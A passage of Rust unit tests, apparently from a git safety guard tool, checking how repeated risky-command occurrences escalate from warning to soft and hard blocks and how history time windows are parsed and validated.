                "soft block (occurrence #2)"
            );
            assert_eq!(
                GraduatedResponse::HardBlock {
                    total_occurrences: 5
                }
                .label(),
                "hard block (5 total occurrences)"
            );
        }

        #[test]
        fn bypass_method_labels() {
            assert_eq!(BypassMethod::Force.label(), "force");
            assert_eq!(BypassMethod::AllowOnce.label(), "allow_once");
        }

        #[test]
        fn decision_mode_strings() {
            assert_eq!(
                GraduatedResponse::Warning { occurrence: 1 }.decision_mode(),
                "warning"
            );
            assert_eq!(
                GraduatedResponse::SoftBlock { occurrence: 1 }.decision_mode(),
                "soft_block"
            );
            assert_eq!(
                GraduatedResponse::HardBlock {
                    total_occurrences: 1
                }
                .decision_mode(),
                "hard_block"
            );
        }

        // ====================================================================
        // History-backed graduation (git_safety_guard-n9j1)
        // ====================================================================

        #[test]
        fn standard_mode_history_count_at_soft_threshold_escalates_to_softblock() {
            // session_count=1 alone in Standard would only Warn. With
            // history_count >= history_soft_block (default 3), the response
            // must escalate to SoftBlock.
            let config = enabled_config();
            let r = determine_graduated_response_with_history(
                1,
                Some(config.history_soft_block),
                Severity::High,
                &config,
            )
            .unwrap();
            assert!(matches!(r, GraduatedResponse::SoftBlock { .. }));
        }

        #[test]
        fn standard_mode_history_count_at_hard_threshold_escalates_to_hardblock() {
            let config = enabled_config();
            let r = determine_graduated_response_with_history(
                1,
                Some(config.history_hard_block),
                Severity::High,
                &config,
            )
            .unwrap();
            assert!(matches!(r, GraduatedResponse::HardBlock { .. }));
        }

        #[test]
        fn standard_mode_history_below_threshold_keeps_session_response() {
            let config = enabled_config();
            // history_count=1, below soft_block=3; session_count=1 → Warning.
            let r = determine_graduated_response_with_history(1, Some(1), Severity::High, &config)
                .unwrap();
            assert!(matches!(r, GraduatedResponse::Warning { occurrence: 1 }));
        }

        #[test]
        fn paranoid_mode_ignores_history_count() {
            let mut config = enabled_config();
            config.mode = GraduationMode::Paranoid;
            // History should not change Paranoid's HardBlock behavior.
            let r =
                determine_graduated_response_with_history(1, Some(99), Severity::Medium, &config)
                    .unwrap();
            assert!(matches!(r, GraduatedResponse::HardBlock { .. }));
        }

        #[test]
        fn lenient_mode_history_can_escalate_when_session_says_none() {
            let mut config = enabled_config();
            config.mode = GraduationMode::Lenient;
            // session_count=1 in Lenient (doubled warn=2) → None.
            // history_count >= soft_block escalates to SoftBlock.
            let r = determine_graduated_response_with_history(
                1,
                Some(config.history_soft_block),
                Severity::Medium,
                &config,
            )
            .unwrap();
            assert!(matches!(r, GraduatedResponse::SoftBlock { .. }));
        }

        #[test]
        fn history_none_matches_legacy_signature() {
            // The new entrypoint with history_count=None must agree exactly
            // with the legacy session-only entrypoint.
            let config = enabled_config();
            for sc in [0, 1, 2, 5, 10] {
                for sev in [
                    Severity::Critical,
                    Severity::High,
                    Severity::Medium,
                    Severity::Low,
                ] {
                    let legacy = determine_graduated_response(sc, sev, &config);
                    let new_none =
                        determine_graduated_response_with_history(sc, None, sev, &config);
                    assert_eq!(legacy, new_none, "must match for sc={sc} sev={sev:?}");
                }
            }
        }

        #[test]
        fn parse_history_window_recognized_units() {
            use crate::config::ResponseConfig;
            assert_eq!(
                ResponseConfig::parse_history_window("24h"),
                Some(chrono::Duration::hours(24))
            );
            assert_eq!(
                ResponseConfig::parse_history_window("7d"),
                Some(chrono::Duration::days(7))
            );
            assert_eq!(
                ResponseConfig::parse_history_window("30m"),
                Some(chrono::Duration::minutes(30))
            );
            assert_eq!(
                ResponseConfig::parse_history_window("90s"),
                Some(chrono::Duration::seconds(90))
            );
            assert_eq!(ResponseConfig::parse_history_window(""), None);
            assert_eq!(ResponseConfig::parse_history_window("24x"), None);
        }

        #[test]
        fn parse_history_window_rejects_negative_and_overflow() {
            use crate::config::ResponseConfig;
            // Negative values would wrap (Utc::now() - (-window) = future cutoff).
            assert_eq!(ResponseConfig::parse_history_window("-1h"), None);
            assert_eq!(ResponseConfig::parse_history_window("-100d"), None);
            // Values beyond the 100-year sane cap are rejected so we never
            // hit chrono's panic-on-overflow path.
            assert_eq!(ResponseConfig::parse_history_window("99999999999d"), None);
            assert_eq!(
                ResponseConfig::parse_history_window("9999999999999999999s"),
                None
            );
            // Right at the cap is accepted.
            assert_eq!(
                ResponseConfig::parse_history_window("36500d"),
                Some(chrono::Duration::days(36500))
            );
        }

        #[test]
        fn parse_history_window_handles_multibyte_trailing_char() {
            use crate::config::ResponseConfig;
            // Regression: previous `split_at(len-1)` would panic on a
            // multi-byte trailing char. Char iteration is safe.
            assert_eq!(ResponseConfig::parse_history_window("24é"), None);
        }
    }
}
